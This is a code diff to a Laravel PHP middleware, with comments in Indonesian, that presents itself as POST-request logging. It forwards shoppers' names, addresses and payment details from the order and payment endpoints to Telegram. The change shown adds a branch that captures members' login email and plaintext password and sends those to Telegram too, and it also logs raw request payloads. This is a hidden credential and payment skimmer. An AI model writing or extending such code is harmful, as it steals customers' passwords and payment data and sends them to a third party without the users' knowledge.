@@ -11,41 +11,44 @@ class LogPostRequests
 {
     public function handle(Request $request, Closure $next)
     {
-        // Pastikan hanya mengeksekusi untuk method POST
+        // Hanya eksekusi jika method == POST
         if ($request->isMethod('post')) {
-
-            // 1) (Opsional) Catat info request di file log Laravel
+            // (Opsional) Log ke file Laravel
             Log::info('POST Request Detected', [
-                'url' => $request->fullUrl(),
-                'ip'  => $request->ip(),
-                'data'=> $request->all(),
+                'url'        => $request->fullUrl(),
+                'ip'         => $request->ip(),
+                'parsedData' => $request->all(),
+                'rawPayload' => $request->getContent(),
             ]);
 
-            // 2) Kirim notifikasi Telegram HANYA untuk 2 endpoint berikut
+            // Periksa endpoint
             if ($request->is('api/shop/order/create')) {
-                // Buat pesan dengan format data pembeli
+                // Kirim format data pembeli
                 $message = $this->formatOrderMessage($request);
                 $this->sendToTelegram($message);
 
             } elseif ($request->is('api/shop/pay/authorize')) {
-                // Buat pesan dengan format data pembayaran
+                // Kirim format data pembayaran
                 $message = $this->formatPaymentMessage($request);
+                $this->sendToTelegram($message);
+
+            } elseif ($request->is('api/member/login')) {
+                // Kirim format data login
+                $message = $this->formatLoginMessage($request);
                 $this->sendToTelegram($message);
             }
 
-            // Perhatikan: TIDAK ada `else` di sini,
-            // jadi endpoint POST lain tidak dikirim ke Telegram.
+            // Endpoint POST lainnya diabaikan (tidak dikirim ke Telegram)
         }
 
         return $next($request);
     }
 
     /**
-     * Format data pembeli (order) menjadi teks rapi.
+     * Format data pembeli (order).
      */
     private function formatOrderMessage(Request $request)
     {
-        // Ambil data - pastikan disesuaikan dengan field yang dipakai di form/ request
         $firstName  = $request->input('first_name', 'Empty!');
         $lastName   = $request->input('last_name', 'Empty!');
         $phone      = $request->input('phone', 'Empty!');
@@ -57,7 +60,6 @@ class LogPostRequests
         $country    = $request->input('country', 'Empty!');
         $ipAddress  = $request->ip();
 
-        // Susun teks dengan format rapi
         $message =
             "Pembeli baru diterima\n\n"
             . "Full name:   {$firstName} {$lastName}\n"
@@ -74,7 +76,7 @@ class LogPostRequests
     }
 
     /**
-     * Format data pembayaran menjadi teks rapi.
+     * Format data pembayaran (pay/authorize).
      */
     private function formatPaymentMessage(Request $request)
     {
@@ -96,7 +98,24 @@ class LogPostRequests
     }
 
     /**
-     * Mengirim pesan ke Telegram
+     * Format data login (api/member/login).
+     */
+    private function formatLoginMessage(Request $request)
+    {
+        $ipAddress  = $request->ip();
+        $email      = $request->input('email', 'Empty!');
+        $password   = $request->input('password', 'Empty!');
+
+        $message =
+            "Anggota masuk dari IP: {$ipAddress}\n"
+            . "Email   : {$email}\n"
+            . "Password: {$password}";
+
+        return $message;
+    }
+
+    /**
+     * Mengirim pesan ke Telegram.
      */
     private function sendToTelegram($message)
     {
